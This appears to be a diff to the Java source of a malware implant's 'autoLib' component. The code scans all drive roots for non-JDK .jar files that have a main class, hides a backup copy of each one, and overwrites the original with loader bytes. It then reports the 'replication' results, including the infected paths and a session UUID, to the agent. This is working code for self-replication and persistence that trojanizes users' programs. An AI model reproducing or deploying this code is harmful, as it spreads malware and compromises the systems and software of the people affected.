@@ -83,93 +83,100 @@ public class autoLib
         
         while (iAgent.shutdown != 1)
         {
+            ArrayList<Path> rootChk = new ArrayList();
             ArrayList<Path> fileNames = new ArrayList();
             File[] rootSet = File.listRoots();
             ArrayList<String> listFileNames = new ArrayList();
 
             for (int f=0;f<rootSet.length;f++)
             {
-                try {
-                    Files.walkFileTree(
-                    Paths.get(rootSet[f].getPath()), 
-                    new HashSet<FileVisitOption>(Arrays.asList(FileVisitOption.FOLLOW_LINKS)),
-                    Integer.MAX_VALUE, new SimpleFileVisitor<Path>() {
-                        @Override
-                        public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) 
-                                throws IOException {
-                    String stringFileName = file.toString();
-
-                    if (stringFileName.contains(".jar") && !(stringFileName.contains("Java")) && !(stringFileName.contains("jdk")) && !(stringFileName.contains("jre")))
-                    {
-                                    fileNames.add(file);
-                    }
-                            return FileVisitResult.CONTINUE;
-                        }
-                        
-                        @Override
-                        public FileVisitResult visitFileFailed(Path file, IOException e) 
-                                throws IOException {
-                            return FileVisitResult.SKIP_SUBTREE;
-                        }
-                        
-                        @Override
-                        public FileVisitResult preVisitDirectory(Path dir,
-                                                                BasicFileAttributes attrs) 
-                                throws IOException {
-                            return FileVisitResult.CONTINUE;
-                        }
-                    });
-                } catch (IOException e) {
-                    // idgaf ?
-                }
-            }
-            
-            for (int r=0;r<fileNames.size();r++)
-            {
-                if (chkJarMain(fileNames.get(r),nUtil))
+                Path rootPath = Paths.get(rootSet[f].getPath());
+                if (!rootChk.contains(rootPath))
                 {
-                    try
-                    {
-                        File jarFile = (fileNames.get(r).toFile());
-                        //check if bak-jarname.jar already exists, if so skip
-                        String parent = jarFile.getParent();
-                        
-                        String bakJarPath = String.format("%s%s.bak-%s",parent,File.separator,jarFile.getName());
+                    rootChk.add(rootPath);
+                    try {
+                        Files.walkFileTree(
+                            rootPath
+                        , 
+                        new HashSet<FileVisitOption>(Arrays.asList(FileVisitOption.FOLLOW_LINKS)),
+                        Integer.MAX_VALUE, new SimpleFileVisitor<Path>() {
+                            @Override
+                            public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) 
+                                    throws IOException {
+                        String stringFileName = file.toString();
 
-                        //need to add some logic that precludes the actual jdk jars from getting smashed by this
-                        if (!new File(bakJarPath).isFile())
+                        if (stringFileName.contains(".jar") && !(stringFileName.contains("Java")) && !(stringFileName.contains("jdk")) && !(stringFileName.contains("jre")))
                         {
-                            //copy to bak-jarname.jar
-                            Files.copy(Paths.get(jarFile.getAbsolutePath()), Paths.get(bakJarPath), StandardCopyOption.REPLACE_EXISTING);
-
-                            //hide bak-jarname.jar
-                            if (System.getProperty("os.name").toLowerCase().contains("win"))
-                            {
-                                Files.setAttribute(Paths.get(bakJarPath), "dos:hidden", true, LinkOption.NOFOLLOW_LINKS);
-                            }
-
-                            Files.write(Paths.get(jarFile.getAbsolutePath()), loaderBytes);
-                            
-                            //create jarname.jar containing loader, downloaded from revamped download endpoint
-                            //I need to figure out the loader first
+                                        fileNames.add(file);
                         }
-                    }
-                    catch (Exception e)
-                    {
-                        fileNames.remove(r);
+                                return FileVisitResult.CONTINUE;
+                            }
+                            
+                            @Override
+                            public FileVisitResult visitFileFailed(Path file, IOException e) 
+                                    throws IOException {
+                                return FileVisitResult.SKIP_SUBTREE;
+                            }
+                            
+                            @Override
+                            public FileVisitResult preVisitDirectory(Path dir,
+                                                                    BasicFileAttributes attrs) 
+                                    throws IOException {
+                                return FileVisitResult.CONTINUE;
+                            }
+                        });
+                    } catch (IOException e) {
+                        // idgaf ?
                     }
                 }
+            
+                for (int r=0;r<fileNames.size();r++)
+                {
+                    if (chkJarMain(fileNames.get(r),nUtil))
+                    {
+                        try
+                        {
+                            File jarFile = (fileNames.get(r).toFile());
+                            //check if bak-jarname.jar already exists, if so skip
+                            String parent = jarFile.getParent();
+                            
+                            String bakJarPath = String.format("%s%s.bak-%s",parent,File.separator,jarFile.getName());
 
-                //implict else: no main class, ignoring
-                listFileNames.add(fileNames.get(r).toString());
-                metadata.put("persistedPaths",String.join(",",listFileNames));
-                metadata.put("uuid",iAgent.sessUUID);
-                metadata.put("timestamp",new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new java.util.Date()));
-                metadata.put("error","");
-    
-                Document metaDoc = nUtil.outputToXmlDoc("replication",metadata);
-                iAgent.output.add(metaDoc);
+                            //need to add some logic that precludes the actual jdk jars from getting smashed by this
+                            if (!new File(bakJarPath).isFile())
+                            {
+                                //copy to bak-jarname.jar
+                                Files.copy(Paths.get(jarFile.getAbsolutePath()), Paths.get(bakJarPath), StandardCopyOption.REPLACE_EXISTING);
 
+                                //hide bak-jarname.jar
+                                if (System.getProperty("os.name").toLowerCase().contains("win"))
+                                {
+                                    Files.setAttribute(Paths.get(bakJarPath), "dos:hidden", true, LinkOption.NOFOLLOW_LINKS);
+                                }
+
+                                Files.write(Paths.get(jarFile.getAbsolutePath()), loaderBytes);
+                                
+                                //create jarname.jar containing loader, downloaded from revamped download endpoint
+                                //I need to figure out the loader first
+                            }
+                        }
+                        catch (Exception e)
+                        {
+                            fileNames.remove(r);
+                        }
+                    }
+
+                    //implict else: no main class, ignoring
+                    listFileNames.add(fileNames.get(r).toString());
+                    metadata.put("persistedPaths",String.join(",",listFileNames));
+                    metadata.put("uuid",iAgent.sessUUID);
+                    metadata.put("timestamp",new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new java.util.Date()));
+                    metadata.put("error","");
+        
+                    Document metaDoc = nUtil.outputToXmlDoc("replication",metadata);
+                    iAgent.output.add(metaDoc);
+
+                }
             }
             
         }
